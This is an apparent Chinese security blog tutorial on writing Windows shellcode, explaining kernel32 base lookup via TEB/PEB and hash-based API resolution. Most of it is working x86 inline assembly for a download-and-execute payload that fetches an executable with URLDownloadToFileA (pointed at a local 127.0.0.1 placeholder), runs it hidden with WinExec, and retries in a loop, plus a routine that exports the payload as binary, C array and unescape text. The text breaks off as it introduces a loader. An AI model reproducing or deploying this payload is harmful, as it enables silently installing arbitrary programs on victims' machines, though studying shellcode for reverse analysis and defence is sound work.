@@ -1,0 +1,719 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <meta charset="utf-8" />
+       
+      <meta name="keywords" content="生活，思考 ，渗透，审计，代码。。。" />
+       
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>Shellcode |  小透的少年江湖</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/haoyun.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-Shellcode"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Shellcode
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2024/06/13/Shellcode/" class="article-date">
+  <time datetime="2024-06-13T12:14:28.000Z" itemprop="datePublished">2024-06-13</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/">逆向分析</a> / <a class="article-category-link" href="/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/Shellcode/">Shellcode</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">2k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">9 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="Shellcode初探"><a href="#Shellcode初探" class="headerlink" title="Shellcode初探"></a>Shellcode初探</h1><p>Shellcode是一段独立执行的代码，在触发缓冲区溢出漏洞并获取eip指针后，将eip指针指向Shellcode以完成漏洞利用过程。Shellcode是漏洞利用的必备要素，可以通过Shellcode近下定位来辅助回溯漏洞原理并确定漏洞特征。</p>
+<h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p>存在形式为一段可以自主运行的汇编代码。通过主动查看DLL基址并动态获取其他API地址的方式来实现API调用，然后根据实际功能调用相应的API函数来完成自身的功能。</p>
+<img src="/2024/06/13/Shellcode/image-20240613103653203.png" class title="image-20240613103653203">
+
+<h3 id="基本模块"><a href="#基本模块" class="headerlink" title="基本模块"></a>基本模块</h3><p>基本模块用于实现Shellcode 初始运行、获取Kernel32基址及获取API地址的过程。</p>
+<p><strong>获取Kernel32基址</strong></p>
+<p>这里使用TEB查找法动态获取Kernel32.dll基址。原理：在NT内核系统中，fs寄存器指向TEB结构，TEB+0x30偏移处指向PEB结构，PEB+0x0c偏移处指向PEB_LDR_DATA结构，PEB_LD_DATA+0x1c偏移处存放着程序加载的动态链接库地址，第1个指向Ntdll.dll，第2个是Kernel32.dll的基地址。如下图所示</p>
+<img src="/2024/06/13/Shellcode/image-20240613104607443.png" class title="image-20240613104607443">
+
+<p>用程序实现这个过程，如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD hKernel32 = <span class="number">0</span>;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//assume	 	fs:nothing</span></span><br><span class="line">		mov   		eax, fs:[<span class="number">30</span>h]</span><br><span class="line">		test  		eax, eax</span><br><span class="line">		js  		os_9x</span><br><span class="line">os_nt:  </span><br><span class="line">		mov  		eax, dword ptr[eax+<span class="number">0</span>ch]</span><br><span class="line">		mov  		esi, dword ptr[eax+<span class="number">1</span>ch]</span><br><span class="line">		lodsd  </span><br><span class="line">		mov   		eax, dword ptr[eax+<span class="number">8</span>]</span><br><span class="line">		jmp  		k_finished</span><br><span class="line">os_9x:</span><br><span class="line">		mov   		eax, dword ptr[eax+<span class="number">34</span>h]</span><br><span class="line">		mov  		eax, dword ptr[eax+<span class="number">7</span>ch]</span><br><span class="line">		mov  		eax, dword ptr[eax+<span class="number">3</span>ch]</span><br><span class="line">k_finished:</span><br><span class="line">		mov  		hKernel32, eax  ;kernel32地址</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;hKernel32 = %x\n&quot;</span>,hKernel32);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如下运行得到Kernnel32的地址</p>
+<img src="/2024/06/13/Shellcode/image-20240614093519250.png" class title="image-20240614093519250">
+
+<p><strong>获取API地址</strong></p>
+<p>找到DLL基址后，去获取里面的API地址，步骤如下</p>
+<ol>
+<li>DLL基址+3ch偏移处获取e_ifanew地址，找到PE文件头</li>
+<li>在PE文件头的78h偏移处得到函数导出表地址</li>
+<li>在导出表的1ch偏移处获取AddressOfFuctions的地址，在导出表的20h偏移处获取AdressOfName的地址，24h偏移处获取AddressOfOrdinalse的地址。</li>
+<li>AddressOfFuctions函数地址数组和AdressOfName函数名数组通过函数AddressOfOrdinalse一一对应</li>
+</ol>
+<img src="/2024/06/13/Shellcode/image-20240613125413901.png" class title="image-20240613125413901">
+
+<p>为了直接使用明文获取函数名称，这里使用将要调用的函数名称使用Hash算法转换为4字节的Hash值。在得到Kernel32里的两个重要API的地址(<strong>Loadlibrary</strong>和<strong>GetProcessAddress</strong>)，通过前面两个函数就可以获取任意DLL中的API地址。</p>
+<h3 id="功能模块"><a href="#功能模块" class="headerlink" title="功能模块"></a>功能模块</h3><p>功能模块就是实现漏洞利用目的的那部分Shellcode。下面为几种常见功能</p>
+<p><strong>下载执行</strong></p>
+<p>其功能就是从指定的URL下载一个exe文件，工作流程如下图所示</p>
+<img src="/2024/06/13/Shellcode/image-20240614094454868.png" class title="image-20240614094454868">
+
+<p><strong>捆绑</strong></p>
+<p>将捆绑在样本自身上的exe数据释放到指定目录下并运行</p>
+<img src="/2024/06/13/Shellcode/image-20240614095210328.png" class title="image-20240614095210328">
+
+<p><strong>反弹shell</strong></p>
+<p>多用于溢出漏洞，实施攻击后获取一个远程shell以执行任意命令</p>
+<img src="/2024/06/13/Shellcode/image-20240614095600548.png" class title="image-20240614095600548">
+
+<h2 id="Shellcode编写"><a href="#Shellcode编写" class="headerlink" title="Shellcode编写"></a>Shellcode编写</h2><p>这里编写一个具有下载执行功能的Shellcode，如下使用C语言的内联汇编格式来编写</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">int</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _asm</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//在这里编写汇编语句</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/////</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h3><p><strong>编写基本模块</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sc_start:</span><br><span class="line">		<span class="comment">//shellcode在这里编写</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		*	shellcode 基本模块</span></span><br><span class="line"><span class="comment">		*	第一步：查找Kernel32基址	</span></span><br><span class="line"><span class="comment">		*</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		<span class="keyword">xor</span>		ecx, ecx</span><br><span class="line">		mov		ecx, dword ptr fs:[<span class="number">30</span>h]</span><br><span class="line">		mov		ecx, dword ptr [ecx+<span class="number">0</span>Ch]</span><br><span class="line">		mov		esi, dword ptr [ecx+<span class="number">1</span>Ch]</span><br><span class="line">sc_goonKernel:  </span><br><span class="line">		mov		eax, dword ptr [esi+<span class="number">8</span>]</span><br><span class="line">        mov		ebx, dword ptr [esi+<span class="number">20</span>h]            </span><br><span class="line">        mov		esi, dword ptr [esi]</span><br><span class="line">        cmp		dword ptr [ebx+<span class="number">0</span>Ch], <span class="number">320033</span>h;判断名称中字符<span class="number">32</span>的unicode</span><br><span class="line">        jnz		sc_goonKernel</span><br><span class="line"></span><br><span class="line">		mov		ebx, eax  ;获取kernel32地址 </span><br></pre></td></tr></table></figure>
+
+<p>上面获取到Kernel32基址获取部分，接下来就是查找API的子函数部分(Hash值查找法)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		*	shellcode 基本模块</span></span><br><span class="line"><span class="comment">		*	查找API地址	</span></span><br><span class="line"><span class="comment">		*</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">FindApi:</span><br><span class="line">		push    ecx</span><br><span class="line">		push    ebp</span><br><span class="line">		mov     esi, dword ptr [ebx+<span class="number">3</span>Ch]	<span class="comment">// e_lfanew</span></span><br><span class="line">		mov     esi, dword ptr [esi+ebx+<span class="number">78</span>h]<span class="comment">// EATAddr</span></span><br><span class="line">		add     esi, ebx</span><br><span class="line">		push    esi</span><br><span class="line">		mov     esi, dword ptr [esi+<span class="number">20</span>h]    <span class="comment">//AddressOfNames</span></span><br><span class="line">		add     esi, ebx</span><br><span class="line">		<span class="keyword">xor</span>     ecx, ecx</span><br><span class="line">		dec     ecx</span><br><span class="line">			</span><br><span class="line">Find_Loop:		</span><br><span class="line">		inc     ecx</span><br><span class="line">		lods    dword ptr [esi]</span><br><span class="line">		add     eax, ebx</span><br><span class="line">		<span class="keyword">xor</span>     ebp, ebp</span><br><span class="line">		<span class="comment">//计算hash值	</span></span><br><span class="line">Hash_Loop:</span><br><span class="line">		movsx   edx, byte ptr [eax]</span><br><span class="line">		cmp     dl, dh</span><br><span class="line">		je      hash_OK</span><br><span class="line">		ror     ebp, <span class="number">7</span></span><br><span class="line">		add     ebp, edx</span><br><span class="line">		inc     eax</span><br><span class="line">		jmp     Hash_Loop</span><br><span class="line">			</span><br><span class="line">hash_OK:</span><br><span class="line">		<span class="comment">//判断hash值是否相等</span></span><br><span class="line">		cmp     ebp, dword ptr [edi]		</span><br><span class="line">		jnz     Find_Loop</span><br><span class="line"></span><br><span class="line">		pop     esi</span><br><span class="line">		mov     ebp, dword ptr [esi+<span class="number">24</span>h]	<span class="comment">//Ordinal Table</span></span><br><span class="line">		add     ebp, ebx</span><br><span class="line">		mov     cx, word ptr [ebp+ecx*<span class="number">2</span>]</span><br><span class="line">		mov     ebp, dword ptr [esi+<span class="number">1</span>Ch]	<span class="comment">//Address Table</span></span><br><span class="line">		add     ebp, ebx</span><br><span class="line">		mov     eax, dword ptr [ebp+ecx*<span class="number">4</span>]</span><br><span class="line">		add     eax, ebx</span><br><span class="line">		stos    dword ptr es:[edi]</span><br><span class="line">		pop     ebp</span><br><span class="line">		pop     ecx</span><br><span class="line">		retn</span><br></pre></td></tr></table></figure>
+
+<p>最后添加API获取流程，下载执行的主功能函数URLDownloadToFile在Urlmon.dll中，要先通过LoadLibrary函数来加载Urlmon.dll，在获取该API的地址，代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">*	第二步：查找API地址	</span><br><span class="line">		*</span><br><span class="line">		*/</span><br><span class="line">		jmp		DataArea</span><br><span class="line">backToMain:</span><br><span class="line">		pop     ebp			//捆绑数据地址</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">		//获取Kernel32中API的地址</span><br><span class="line">		//ebx赋值dll基址</span><br><span class="line">		//edi赋值hash值地址</span><br><span class="line">		//ecx赋值API数量</span><br><span class="line">		mov     edi, ebp</span><br><span class="line">		mov		ecx, 07h</span><br><span class="line">FindApi_loop:		</span><br><span class="line">		call    FindApi //循环查找API地址</span><br><span class="line">		loop	FindApi_loop</span><br><span class="line"></span><br><span class="line">		//调用LoadLibraryA加载urlmon</span><br><span class="line">		push	6e6fh</span><br><span class="line">		push	6d6c7275h</span><br><span class="line">		mov		eax, esp</span><br><span class="line">		push	eax</span><br><span class="line">		call	dword ptr[ebp] //Kernel32.LoadLibrary</span><br><span class="line">		mov		ebx, eax</span><br><span class="line">		pop     eax</span><br><span class="line">		pop     eax	//平衡栈</span><br><span class="line"></span><br><span class="line">		//获取urlmon中API的地址		</span><br><span class="line">		call    FindApi</span><br></pre></td></tr></table></figure>
+
+<p><strong>功能模块</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">		*	shellcode 功能模块</span></span><br><span class="line"><span class="comment">		*	第一步：下载路径设置	</span></span><br><span class="line"><span class="comment">		*</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		<span class="comment">//申请空间存放文件路径 </span></span><br><span class="line">		push    <span class="number">40</span>h</span><br><span class="line">		push    <span class="number">1000</span>h</span><br><span class="line">		push    <span class="number">100</span>h			<span class="comment">//申请空间大小</span></span><br><span class="line">		push    <span class="number">0</span></span><br><span class="line">		call    dword ptr [ebp+<span class="number">04</span>h]	<span class="comment">//	kernel32.VirtualAlloc</span></span><br><span class="line">		mov     dword ptr [ebp+<span class="number">20</span>h], eax</span><br><span class="line">		<span class="comment">//获取临时文件夹路径</span></span><br><span class="line">		push	eax</span><br><span class="line">		push	<span class="number">100</span>h</span><br><span class="line">		call	dword ptr [ebp+<span class="number">0</span>ch]<span class="comment">//Kernel32.GetTempPathA</span></span><br><span class="line">		<span class="comment">//设置临时exe文件路径</span></span><br><span class="line">		<span class="comment">//%TEMP%\test.exe</span></span><br><span class="line">		mov		ecx, dword ptr[ebp+<span class="number">20</span>h]</span><br><span class="line">		add		ecx, eax</span><br><span class="line">		mov		dword ptr[ecx], <span class="number">74736574</span>h</span><br><span class="line">		mov		dword ptr[ecx+<span class="number">4</span>], <span class="number">6578652</span>eh</span><br><span class="line">		mov		dword ptr[ecx+<span class="number">8</span>], <span class="number">0</span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		*	shellcode 功能模块</span></span><br><span class="line"><span class="comment">		*	第二步：下载文件URLDownloadToFile	</span></span><br><span class="line"><span class="comment">		*</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">try_Download:</span><br><span class="line">		push	<span class="number">0</span></span><br><span class="line">		push	<span class="number">0</span></span><br><span class="line">		push	dword ptr[ebp+<span class="number">20</span>h]<span class="comment">//exe路径</span></span><br><span class="line">		lea		eax, dword ptr[ebp+<span class="number">24</span>h]<span class="comment">//URL</span></span><br><span class="line">		push	eax</span><br><span class="line">		push	<span class="number">0</span></span><br><span class="line">		call	dword ptr[ebp+<span class="number">1</span>ch]<span class="comment">//urlmon.URLDowanloadToFileA</span></span><br><span class="line">		test	eax, eax</span><br><span class="line">		jz		Download_OK</span><br><span class="line">		push	<span class="number">30000</span><span class="comment">//休眠30秒重试</span></span><br><span class="line">		call	dword ptr[ebp+<span class="number">14</span>h]<span class="comment">//Kernel32.Sleep</span></span><br><span class="line">		jmp		try_Download</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		*	shellcode 功能模块</span></span><br><span class="line"><span class="comment">		*	第三步：运行文件WinExec	</span></span><br><span class="line"><span class="comment">		*</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">Download_OK:</span><br><span class="line">		push	SW_HIDE</span><br><span class="line">		push	dword ptr[ebp+<span class="number">20</span>h]</span><br><span class="line">		call	dword ptr[ebp+<span class="number">10</span>h]<span class="comment">//Kernel32.WinExec</span></span><br><span class="line">		</span><br><span class="line">		push    <span class="number">08000</span>h</span><br><span class="line">		push    <span class="number">00</span>h</span><br><span class="line">		push    dword ptr [ebp+<span class="number">20</span>h]</span><br><span class="line">		call    dword ptr [ebp+<span class="number">08</span>h]<span class="comment">//kernel32.VirtualFree</span></span><br><span class="line"></span><br><span class="line">		push	<span class="number">0</span></span><br><span class="line">		push	<span class="number">0F</span>FFFFFFFh</span><br><span class="line">		call	dword ptr[ebp+<span class="number">18</span>h]<span class="comment">//Kernel32.TerminateProcess</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="shellcode提取"><a href="#shellcode提取" class="headerlink" title="shellcode提取"></a>shellcode提取</h3><p>Shellcode可以独立运行，可以利用C++代码读取内联汇编区域所对应的内存数据，将其存储为指定的数据格式。下面的代码可以将Shellcode字典提取为bin、C数组和unescape这3中数据格式。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">getShellcode:</span><br><span class="line">	_asm</span><br><span class="line">	&#123;		</span><br><span class="line">		mov		scStart, offset sc_start</span><br><span class="line">		mov		scEnd, offset sc_end</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD scLen = scEnd - scStart;</span><br><span class="line">	<span class="keyword">char</span> Datas[] = </span><br><span class="line">		<span class="string">&quot;\x32\x74\x91\x0c&quot;</span>		<span class="comment">//ebp,Kernel32.LoadLibraryA</span></span><br><span class="line">		<span class="string">&quot;\x67\x59\xde\x1e&quot;</span>		<span class="comment">//ebp+4,Kernel32.VirtualAlloc</span></span><br><span class="line">		<span class="string">&quot;\x05\xaa\x44\x61&quot;</span>		<span class="comment">//ebp+8,Kernel32.VirtualFree</span></span><br><span class="line">		<span class="string">&quot;\x39\xe2\x7D\x83&quot;</span>		<span class="comment">//ebp+0ch,Kernel32.GetTempPathA</span></span><br><span class="line">		<span class="string">&quot;\x51\x2f\xa2\x01&quot;</span>		<span class="comment">//ebp+10h,Kernel32.WinExec</span></span><br><span class="line">		<span class="string">&quot;\xa0\x65\x97\xcb&quot;</span>		<span class="comment">//ebp+14h,Kernel32.Sleep</span></span><br><span class="line">		<span class="string">&quot;\x8f\xf2\x18\x61&quot;</span>		<span class="comment">//ebp+18h,Kernel32.TerminateProcess </span></span><br><span class="line">		<span class="string">&quot;\x80\xd6\xaf\x9a&quot;</span>		<span class="comment">//ebp+1ch,Urlmon.URLDownloadToFileA</span></span><br><span class="line">		<span class="string">&quot;\x00\x00\x00\x00&quot;</span>		<span class="comment">//ebp+20h,变量空间</span></span><br><span class="line">		<span class="string">&quot;http://127.0.0.1/calc.exe&quot;</span><span class="comment">//ebp+24h,设置下载地址</span></span><br><span class="line">		<span class="string">&quot;\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> newscBuff_length = scLen+<span class="keyword">sizeof</span>(Datas);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *newscBuff = <span class="keyword">new</span> <span class="keyword">unsigned</span> <span class="keyword">char</span>[newscBuff_length];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(newscBuff,<span class="number">0x00</span>,newscBuff_length);</span><br><span class="line">	<span class="built_in">memcpy</span>(newscBuff,(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)scStart,scLen);</span><br><span class="line">	<span class="built_in">memcpy</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(newscBuff+scLen),Datas,<span class="keyword">sizeof</span>(Datas));</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> xxx;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; newscBuff_length; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		xxx = ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)newscBuff)[i];</span><br><span class="line">		xxx = xxx ^ <span class="number">0x00</span>;</span><br><span class="line">		newscBuff[i] = xxx;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	FILE *fp = fopen(<span class="string">&quot;./shellcode_bin.bin&quot;</span>,<span class="string">&quot;wb+&quot;</span>);</span><br><span class="line">	fwrite(newscBuff,newscBuff_length,<span class="number">1</span>,fp);</span><br><span class="line">	fclose(fp);</span><br><span class="line">	</span><br><span class="line">	FILE *fp_cpp = fopen(<span class="string">&quot;./shellcode_cpp.cpp&quot;</span>,<span class="string">&quot;wb+&quot;</span>);</span><br><span class="line">	fwrite(<span class="string">&quot;unsigned char sc[] = &#123;&quot;</span>,<span class="number">22</span>,<span class="number">1</span>,fp_cpp);</span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;newscBuff_length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (i%<span class="number">16</span>==<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			fwrite(<span class="string">&quot;\r\n&quot;</span>,<span class="number">2</span>,<span class="number">1</span>,fp_cpp);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">fprintf</span>(fp_cpp,<span class="string">&quot;0x%02x,&quot;</span>,newscBuff[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	fwrite(<span class="string">&quot;&#125;;&quot;</span>,<span class="number">2</span>,<span class="number">1</span>,fp_cpp);</span><br><span class="line">	fclose(fp_cpp);</span><br><span class="line">	</span><br><span class="line">	FILE *fp_unicode = fopen(<span class="string">&quot;./shellcode_unescape.txt&quot;</span>,<span class="string">&quot;wb+&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; newscBuff_length; i += <span class="number">2</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(fp_unicode,<span class="string">&quot;%%u%02x%02x&quot;</span>,newscBuff[i+<span class="number">1</span>],newscBuff[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp_unicode);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Hello World!\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>要直接调试从样本中提取出来的bin文件，需要自己写一个ShellcodeLoader，以便加载bin文件进行调试。代码如下：</p>
